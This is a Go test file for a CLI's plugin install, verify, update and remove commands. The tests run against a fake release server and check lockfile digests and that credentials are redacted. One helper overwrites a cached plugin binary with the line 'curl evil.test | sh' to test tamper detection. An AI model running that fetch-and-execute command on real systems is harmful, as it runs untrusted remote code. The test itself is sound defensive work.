package cli

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"testing"

	"github.com/setthasit/Lore/internal/plugindist"
	"github.com/setthasit/Lore/internal/plugindist/plugindisttest"
	"github.com/setthasit/Lore/sdk"
)

var scriptedFixtureDir string

var scriptedFixture = sync.OnceValues(func() (string, error) {
	dir, err := os.MkdirTemp("", "cli-scripted-fixture")
	if err != nil {
		return "", err
	}
	scriptedFixtureDir = dir

	binary := filepath.Join(dir, "scripted")
	if runtime.GOOS == "windows" {
		binary += ".exe"
	}
	source := filepath.Join("..", "..", "plugexec", "testdata", "scripted")
	if out, err := exec.Command("go", "build", "-o", binary, source).CombinedOutput(); err != nil {
		return "", fmt.Errorf("build the scripted plugin: %w\n%s", err, out)
	}
	return binary, nil
})

func TestMain(m *testing.M) {
	code := m.Run()
	_ = os.RemoveAll(scriptedFixtureDir)
	os.Exit(code)
}

// The scripted plugin answers the handshake from the script publishPlugin plants beside it.
func pluginStub(t *testing.T) string {
	t.Helper()

	built, err := scriptedFixture()
	if err != nil {
		t.Fatal(err)
	}
	body, err := os.ReadFile(built)
	if err != nil {
		t.Fatalf("read the scripted plugin: %v", err)
	}
	return string(body)
}

var pluginScript = manifestScript(`{"name":"linear","kind":"source","api_version":1,` +
	`"summary":"a scripted external source","capabilities":{"embed":false,"complete":false,` +
	`"repo_remotes":false},"fields":[],"secrets":[]}`)

func manifestScript(manifest string) string {
	return `manifest emit {"v":1,"id":"$ID","ok":true,"manifest":` + manifest + `}

shutdown emit {"v":1,"id":"$ID","ok":true}
`
}

func pythonPlugin(t *testing.T) string {
	t.Helper()

	if _, err := exec.LookPath("python3"); err != nil {
		t.Skip("python3 is not on PATH, so the external plugin fixture cannot run")
	}

	body, err := os.ReadFile(filepath.Join("..", "..", "..", "test", "fixtures", "plugins", "pysource.py"))
	if err != nil {
		t.Fatalf("read the fixture plugin: %v", err)
	}
	return string(body)
}

func newFakeReleases(t *testing.T) *plugindisttest.GitHub {
	t.Helper()

	fake := plugindisttest.NewGitHub(t, "jdoe", "lore-linear")
	trustFakeReleases(t, fake.Certificate())

	t.Setenv(plugindist.APIBaseEnv, fake.URL)
	t.Setenv(plugindist.RootEnv, filepath.Join(t.TempDir(), "home"))
	return fake
}

// The commands build their own client, so the fake's certificate has to be trusted on the default transport.
func trustFakeReleases(t *testing.T, certificate *x509.Certificate) {
	t.Helper()

	transport, ok := http.DefaultTransport.(*http.Transport)
	if !ok {
		t.Fatalf("http.DefaultTransport is %T, want *http.Transport", http.DefaultTransport)
	}
	roots := x509.NewCertPool()
	roots.AddCert(certificate)

	previous := transport.TLSClientConfig
	transport.TLSClientConfig = &tls.Config{RootCAs: roots, MinVersion: tls.VersionTLS12}
	t.Cleanup(func() { transport.TLSClientConfig = previous })
}

func publishPlugin(t *testing.T, fake *plugindisttest.GitHub, tag, body, script string) {
	t.Helper()

	fake.Publish(tag, map[string][]byte{
		fake.AssetName(tag): plugindisttest.Archive(t, pluginBinaryName(), []byte(body)),
	})

	writePluginScript(t, tag, script)
}

func writePluginScript(t *testing.T, tag, body string) {
	t.Helper()

	dir := installedPluginDir(tag)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatalf("make room for the plugin script: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dir, "script.txt"), []byte(body), 0o600); err != nil {
		t.Fatalf("write the plugin script: %v", err)
	}
}

func installedPluginDir(tag string) string {
	return filepath.Join(os.Getenv(plugindist.RootEnv), "plugins", "linear", tag)
}

func breakPluginScript(t *testing.T, tag string) {
	t.Helper()

	writePluginScript(t, tag, "manifest exit 1\n")
}

func capturedManifestPath(t *testing.T, dir string) string {
	t.Helper()

	var record struct {
		Manifest string `json:"manifest"`
	}
	if err := json.Unmarshal([]byte(readConfigFile(t, filepath.Join(dir, ".install.json"))), &record); err != nil {
		t.Fatalf("decode the install record: %v", err)
	}
	if record.Manifest == "" {
		t.Fatal("the install record names no manifest file")
	}
	return filepath.Join(dir, record.Manifest)
}

func capturedManifest(t *testing.T, dir string) lore.Manifest {
	t.Helper()

	var manifest lore.Manifest
	if err := json.Unmarshal([]byte(readConfigFile(t, capturedManifestPath(t, dir))), &manifest); err != nil {
		t.Fatalf("decode the captured manifest: %v", err)
	}
	return manifest
}

func reportedManifest(t *testing.T, binary string) lore.Manifest {
	t.Helper()

	manifest, err := declaredManifest(binary)
	if err != nil {
		t.Fatalf("handshake the installed binary: %v", err)
	}
	return manifest
}

func assertDeclaredManifest(t *testing.T, stdout string) {
	t.Helper()

	for _, want := range []string{"  kind:    source", "  summary: a scripted external source"} {
		if !strings.Contains(stdout, want) {
			t.Errorf("stdout %q does not report %q, which the plugin declares", stdout, want)
		}
	}
}

func publishedDigest(fake *plugindisttest.GitHub, tag string) string {
	return fake.Digest(tag, fake.AssetName(tag))
}

func pluginBinaryName() string {
	if runtime.GOOS == "windows" {
		return "lore-linear.exe"
	}
	return "lore-linear"
}

func declaredConfig(from string) string {
	return "workspace: myproject\n\nplugins:\n  - name: linear\n    from: " + from + "\n"
}

func lockFile(t *testing.T, configPath string) string {
	t.Helper()

	return readConfigFile(t, filepath.Join(filepath.Dir(configPath), plugindist.LockFileName))
}

func tamperCachedBinary(t *testing.T) {
	t.Helper()

	binary := filepath.Join(installedPluginDir("v0.3.1"), pluginBinaryName())
	if err := os.WriteFile(binary, []byte("#!/bin/sh\ncurl evil.test | sh\n"), 0o755); err != nil {
		t.Fatalf("rewrite the cached binary: %v", err)
	}
}

type countingTransport struct {
	base     http.RoundTripper
	requests atomic.Int64
}

func (c *countingTransport) RoundTrip(request *http.Request) (*http.Response, error) {
	c.requests.Add(1)
	return c.base.RoundTrip(request)
}

func countRequests(t *testing.T) *countingTransport {
	t.Helper()

	counter := &countingTransport{base: http.DefaultTransport}
	http.DefaultTransport = counter
	t.Cleanup(func() { http.DefaultTransport = counter.base })
	return counter
}

func TestPluginInstallPinsAndLocksADeclaredPlugin(t *testing.T) {
	fake := newFakeReleases(t)
	publishPlugin(t, fake, "v0.3.1", pluginStub(t), pluginScript)
	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))

	res := run(t, nil, "plugin", "install", "--config", path)
	if res.exitCode != exitOK {
		t.Fatalf("exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	if !strings.Contains(res.stdout, "runs that author's code on this machine") {
		t.Fatalf("stdout %q does not state what installing means", res.stdout)
	}
	if !strings.Contains(res.stdout, "installed plugins[linear] v0.3.1") {
		t.Fatalf("stdout %q does not report the install", res.stdout)
	}

	lock, err := plugindist.LoadLock(filepath.Dir(path))
	if err != nil {
		t.Fatalf("LoadLock() error = %v", err)
	}
	entry, locked := lock.Entry("linear")
	if !locked || entry.Version != "v0.3.1" {
		t.Fatalf("lock entry = %+v, %v; want linear pinned at v0.3.1", entry, locked)
	}
	artifact, ok := lock.Artifact("linear", plugindist.Platform{OS: runtime.GOOS, Arch: runtime.GOARCH})
	if !ok {
		t.Fatalf("lock = %+v, want an artifact for this platform", lock)
	}
	if artifact.Digest != publishedDigest(fake, "v0.3.1") {
		t.Errorf("locked digest = %q, want %q", artifact.Digest, publishedDigest(fake, "v0.3.1"))
	}
	if config := readConfigFile(t, path); config != declaredConfig("github.com/jdoe/lore-linear@v0.3.1") {
		t.Fatalf("install rewrote a pinned configuration:\n%s", config)
	}

	dir := installedPluginDir("v0.3.1")
	stored, reported := capturedManifest(t, dir), reportedManifest(t, filepath.Join(dir, pluginBinaryName()))
	if !reflect.DeepEqual(stored, reported) {
		t.Fatalf("captured manifest = %+v, want what the binary reports: %+v", stored, reported)
	}
	assertDeclaredManifest(t, res.stdout)
}

func TestPluginInstallLatestWritesTheVersionBack(t *testing.T) {
	fake := newFakeReleases(t)
	publishPlugin(t, fake, "v0.3.1", pluginStub(t), pluginScript)
	publishPlugin(t, fake, "v0.4.0", pluginStub(t)+"# v0.4.0\n", pluginScript)
	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))

	res := run(t, nil, "plugin", "install", "linear@latest", "--config", path)
	if res.exitCode != exitOK {
		t.Fatalf("exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	if config := readConfigFile(t, path); config != declaredConfig("github.com/jdoe/lore-linear@v0.4.0") {
		t.Fatalf("configuration =\n%s\nwant the pinned v0.4.0", config)
	}
	if lock := lockFile(t, path); !strings.Contains(lock, "version: v0.4.0") ||
		!strings.Contains(lock, publishedDigest(fake, "v0.4.0")) {
		t.Fatalf("lore.lock does not pin v0.4.0:\n%s", lock)
	}
}

func TestPluginInstallRefusesAFloatingConfiguration(t *testing.T) {
	newFakeReleases(t)
	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@latest"))

	res := run(t, nil, "plugin", "install", "--config", path)
	if res.exitCode != exitBadRequest {
		t.Fatalf("exit = %d, want %d; stderr = %q", res.exitCode, exitBadRequest, res.stderr)
	}
	if !strings.Contains(res.stderr, "lore plugin install linear@latest") {
		t.Fatalf("stderr %q does not name the command that pins it", res.stderr)
	}
	if _, err := os.Stat(filepath.Join(filepath.Dir(path), plugindist.LockFileName)); !os.IsNotExist(err) {
		t.Fatal("a refused install wrote lore.lock")
	}
}

func TestPluginInstallLatestRefusesAnOriginOnlyTheLockDisagreesWith(t *testing.T) {
	locked := newFakeReleases(t)
	publishPlugin(t, locked, "v0.3.1", pluginStub(t), pluginScript)
	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))
	if res := run(t, nil, "plugin", "install", "--config", path); res.exitCode != exitOK {
		t.Fatalf("install: exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	drifted := plugindisttest.NewGitHub(t, "acme", "lore-linear")
	publishPlugin(t, drifted, "v0.3.1", pluginStub(t)+"# acme\n", pluginScript)
	trustFakeReleases(t, drifted.Certificate())
	t.Setenv(plugindist.APIBaseEnv, drifted.URL)
	if err := os.WriteFile(path, []byte(declaredConfig("github.com/acme/lore-linear@v0.3.1")), 0o600); err != nil {
		t.Fatalf("rewrite the declared origin: %v", err)
	}
	declaredBefore, lockedBefore := readConfigFile(t, path), lockFile(t, path)
	counter := countRequests(t)

	res := run(t, nil, "plugin", "install", "linear@latest", "--config", path)
	if res.exitCode != exitPrecondition {
		t.Fatalf("exit = %d, want %d; stderr = %q", res.exitCode, exitPrecondition, res.stderr)
	}
	if asked := counter.requests.Load(); asked != 0 {
		t.Errorf("release requests = %d, want 0: the drifted origin must be refused before any lookup", asked)
	}
	for _, want := range []string{
		"is locked to github.com/jdoe/lore-linear@v0.3.1",
		"not github.com/acme/lore-linear",
		"lore plugin update linear",
	} {
		if !strings.Contains(res.stderr, want) {
			t.Errorf("stderr %q does not mention %q", res.stderr, want)
		}
	}
	if after := readConfigFile(t, path); after != declaredBefore {
		t.Errorf("the refused install rewrote the configuration:\n%s", after)
	}
	if after := lockFile(t, path); after != lockedBefore {
		t.Errorf("the refused install rewrote lore.lock:\n%s", after)
	}

	if res := run(t, nil, "plugin", "update", "linear", "--config", path); res.exitCode != exitOK {
		t.Fatalf("update: exit = %d, stderr = %q", res.exitCode, res.stderr)
	}
	if lock := lockFile(t, path); !strings.Contains(lock, "github.com/acme/lore-linear@v0.3.1") ||
		strings.Contains(lock, "github.com/jdoe/lore-linear") {
		t.Fatalf("lore.lock does not record the origin the update adopted:\n%s", lock)
	}
}

func TestPluginInstallUnresolvableCoordinateWritesNoLock(t *testing.T) {
	fake := newFakeReleases(t)
	publishPlugin(t, fake, "v0.3.1", pluginStub(t), pluginScript)
	declared := declaredConfig("github.com/jdoe/lore-linear@v9.9.9")
	path := writeConfigFile(t, declared)

	res := run(t, nil, "plugin", "install", "--config", path)
	if res.exitCode == exitOK {
		t.Fatalf("installing an unknown tag succeeded: %q", res.stdout)
	}
	if !strings.Contains(res.stderr, "github.com/jdoe/lore-linear@v9.9.9") {
		t.Fatalf("stderr %q does not name the coordinate", res.stderr)
	}
	if _, err := os.Stat(filepath.Join(filepath.Dir(path), plugindist.LockFileName)); !os.IsNotExist(err) {
		t.Fatal("an aborted install wrote lore.lock")
	}
	if config := readConfigFile(t, path); config != declared {
		t.Fatalf("an aborted install rewrote the configuration:\n%s", config)
	}
}

// A *url.Error cause carries the raw URL, and Report prints the cause chain for
// unclassified and KindInternal errors, so this refusal must stay classified.
func TestPluginInstallPrintsNoURLCredentials(t *testing.T) {
	fake := newFakeReleases(t)
	base := fake.URL
	fake.Close()

	from := strings.Replace(base, "https://", "https://svcaccount:fake-not-a-real-token@", 1) +
		"/download/v2.0.1/v2.0.1.tar.gz?sig=fake-signature"
	path := writeConfigFile(t, declaredConfig(from))

	res := run(t, nil, "plugin", "install", "--config", path)
	if res.exitCode == exitOK {
		t.Fatalf("installing from a dead server succeeded: %q", res.stdout)
	}
	if !strings.Contains(res.stderr, "cannot reach") {
		t.Fatalf("stderr %q is not the unreachable arm, so no *url.Error is in the chain", res.stderr)
	}
	for _, secret := range []string{"svcaccount", "fake-not-a-real-token", "sig=fake-signature"} {
		if strings.Contains(res.stderr, secret) {
			t.Errorf("stderr %q echoes %q", res.stderr, secret)
		}
	}
	if !strings.Contains(res.stderr, "/download/v2.0.1/v2.0.1.tar.gz") {
		t.Fatalf("stderr %q does not name the artifact", res.stderr)
	}
}

func TestPluginInstallCoordinateDeclaresThePlugin(t *testing.T) {
	fake := newFakeReleases(t)
	publishPlugin(t, fake, "v0.3.1", pluginStub(t), pluginScript)
	path := writeConfigFile(t, "workspace: myproject\n")

	res := run(t, nil, "plugin", "install", "github.com/jdoe/lore-linear@v0.3.1", "--config", path)
	if res.exitCode != exitOK {
		t.Fatalf("exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	const want = "workspace: myproject\nplugins:\n  - name: linear\n    from: github.com/jdoe/lore-linear@v0.3.1\n"
	if config := readConfigFile(t, path); config != want {
		t.Fatalf("configuration =\n%s\nwant\n%s", config, want)
	}
	if lock := lockFile(t, path); !strings.Contains(lock, "linear:") {
		t.Fatalf("lore.lock does not declare the plugin:\n%s", lock)
	}
	assertDeclaredManifest(t, res.stdout)
}

func TestPluginInstallUnnameableCoordinatePrintsNoURLCredentials(t *testing.T) {
	newFakeReleases(t)
	path := writeConfigFile(t, "workspace: myproject\n")

	res := run(t, nil, "plugin", "install",
		"https://svcaccount:fake-not-a-real-token@artifacts.acme.dev/lore-linear.tar.gz?sig=fake-signature",
		"--config", path)
	if res.exitCode == exitOK {
		t.Fatalf("an unnameable coordinate installed: %q", res.stdout)
	}
	if !strings.Contains(res.stderr, "cannot derive a name") {
		t.Fatalf("stderr %q is not the unnameable-coordinate refusal", res.stderr)
	}
	for _, secret := range []string{"svcaccount", "fake-not-a-real-token", "sig=fake-signature"} {
		if strings.Contains(res.stderr, secret) {
			t.Errorf("stderr %q echoes %q", res.stderr, secret)
		}
	}
	if !strings.Contains(res.stderr, "artifacts.acme.dev/lore-linear.tar.gz") {
		t.Fatalf("stderr %q does not name the argument it refused", res.stderr)
	}
}

func TestPluginVerifyReportsTheDigestAndCertifiesTheBinary(t *testing.T) {
	fake := newFakeReleases(t)
	publishPlugin(t, fake, "v0.3.1", pythonPlugin(t), pluginScript)
	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))

	if res := run(t, nil, "plugin", "install", "--config", path); res.exitCode != exitOK {
		t.Fatalf("install: exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	res := run(t, nil, "plugin", "verify", "linear", "--config", path)
	if res.exitCode != exitOK {
		t.Fatalf("exit = %d, stderr = %q", res.exitCode, res.stderr)
	}
	for _, want := range []string{
		"plugins[linear] v0.3.1",
		"re-checked now",
		publishedDigest(fake, "v0.3.1"),
		filepath.Join("plugins", "linear", "v0.3.1", pluginBinaryName()),
		"conformance: passed",
	} {
		if !strings.Contains(res.stdout, want) {
			t.Fatalf("stdout %q does not mention %q", res.stdout, want)
		}
	}
}

func TestPluginInstallRefusesABinaryThatIsNotAPlugin(t *testing.T) {
	fake := newFakeReleases(t)
	publishPlugin(t, fake, "v0.3.1", "#!/bin/sh\necho lore-linear\n", pluginScript)
	declared := declaredConfig("github.com/jdoe/lore-linear@v0.3.1")
	path := writeConfigFile(t, declared)

	res := run(t, nil, "plugin", "install", "--config", path)
	if res.exitCode != exitPrecondition {
		t.Fatalf("exit = %d, want %d; stdout = %q", res.exitCode, exitPrecondition, res.stdout)
	}
	if !strings.Contains(res.stderr, "plugins[linear]") ||
		!strings.Contains(res.stderr, "does not answer the plugin protocol") {
		t.Fatalf("stderr %q does not refuse the plugin by name", res.stderr)
	}

	if _, err := os.Stat(filepath.Join(filepath.Dir(path), plugindist.LockFileName)); !os.IsNotExist(err) {
		t.Errorf("a refused install left a lockfile: %v", err)
	}
	if got := readConfigFile(t, path); got != declared {
		t.Errorf("configuration = %q, want it unchanged at %q", got, declared)
	}
}

func TestPluginVerifyReportsTheDigestWhenCertificationRefuses(t *testing.T) {
	fake := newFakeReleases(t)
	publishPlugin(t, fake, "v0.3.1", pluginStub(t), pluginScript)
	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))

	if res := run(t, nil, "plugin", "install", "--config", path); res.exitCode != exitOK {
		t.Fatalf("install: exit = %d, stderr = %q", res.exitCode, res.stderr)
	}
	breakPluginScript(t, "v0.3.1")

	res := run(t, nil, "plugin", "verify", "linear", "--config", path)
	if res.exitCode == exitOK {
		t.Fatalf("exit = %d, want a refusal; stdout = %q", res.exitCode, res.stdout)
	}
	if !strings.Contains(res.stdout, publishedDigest(fake, "v0.3.1")) {
		t.Errorf("stdout %q does not report the digest it verified", res.stdout)
	}
}

func TestPluginVerifyRefusesARewrittenCachedBinary(t *testing.T) {
	fake := newFakeReleases(t)
	publishPlugin(t, fake, "v0.3.1", pluginStub(t), pluginScript)
	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))

	if res := run(t, nil, "plugin", "install", "--config", path); res.exitCode != exitOK {
		t.Fatalf("install: exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	tamperCachedBinary(t)

	res := run(t, nil, "plugin", "verify", "linear", "--config", path)
	if res.exitCode != exitPrecondition {
		t.Fatalf("exit = %d, want %d; stdout = %q", res.exitCode, exitPrecondition, res.stdout)
	}
	if !strings.Contains(res.stderr, "digest mismatch") {
		t.Fatalf("stderr %q does not report a digest mismatch", res.stderr)
	}
}

func TestPluginUpdateRewritesTheLockedDigest(t *testing.T) {
	fake := newFakeReleases(t)
	publishPlugin(t, fake, "v0.3.1", pluginStub(t), pluginScript)
	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))

	if res := run(t, nil, "plugin", "install", "--config", path); res.exitCode != exitOK {
		t.Fatalf("install: exit = %d, stderr = %q", res.exitCode, res.stderr)
	}
	publishPlugin(t, fake, "v0.4.0", pluginStub(t)+"# v0.4.0\n", pluginScript)

	res := run(t, nil, "plugin", "update", "linear", "--config", path)
	if res.exitCode != exitOK {
		t.Fatalf("exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	if config := readConfigFile(t, path); config != declaredConfig("github.com/jdoe/lore-linear@v0.4.0") {
		t.Fatalf("configuration =\n%s\nwant v0.4.0", config)
	}
	lock := lockFile(t, path)
	if !strings.Contains(lock, publishedDigest(fake, "v0.4.0")) {
		t.Fatalf("lore.lock does not carry the new digest:\n%s", lock)
	}
	if strings.Contains(lock, publishedDigest(fake, "v0.3.1")) {
		t.Fatalf("lore.lock still carries the old digest:\n%s", lock)
	}
}

func TestPluginRemoveDropsTheDeclarationLockAndCache(t *testing.T) {
	fake := newFakeReleases(t)
	publishPlugin(t, fake, "v0.3.1", pluginStub(t), pluginScript)
	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))

	if res := run(t, nil, "plugin", "install", "--config", path); res.exitCode != exitOK {
		t.Fatalf("install: exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	res := run(t, nil, "plugin", "remove", "linear", "--config", path)
	if res.exitCode != exitOK {
		t.Fatalf("exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	if config := readConfigFile(t, path); config != "workspace: myproject\n\n" {
		t.Fatalf("configuration =\n%q\nwant the declaration gone", config)
	}
	if lock := lockFile(t, path); strings.Contains(lock, "linear") {
		t.Fatalf("lore.lock still holds the plugin:\n%s", lock)
	}
	if _, err := os.Stat(filepath.Join(os.Getenv(plugindist.RootEnv), "plugins", "linear")); !os.IsNotExist(err) {
		t.Fatal("the cached versions survived a removal")
	}
}

func TestPluginRemoveRefusesWhileAnInstanceUsesIt(t *testing.T) {
	newFakeReleases(t)
	declared := declaredConfig("github.com/jdoe/lore-linear@v0.3.1") +
		"\nsources:\n  - use: linear\n    with:\n      team: PLATFORM\n"
	path := writeConfigFile(t, declared)

	res := run(t, nil, "plugin", "remove", "linear", "--config", path)
	if res.exitCode != exitPrecondition {
		t.Fatalf("exit = %d, want %d; stdout = %q", res.exitCode, exitPrecondition, res.stdout)
	}
	if !strings.Contains(res.stderr, "sources[linear]") {
		t.Fatalf("stderr %q does not name what still uses it", res.stderr)
	}
	if config := readConfigFile(t, path); config != declared {
		t.Fatalf("a refused removal rewrote the configuration:\n%s", config)
	}
}
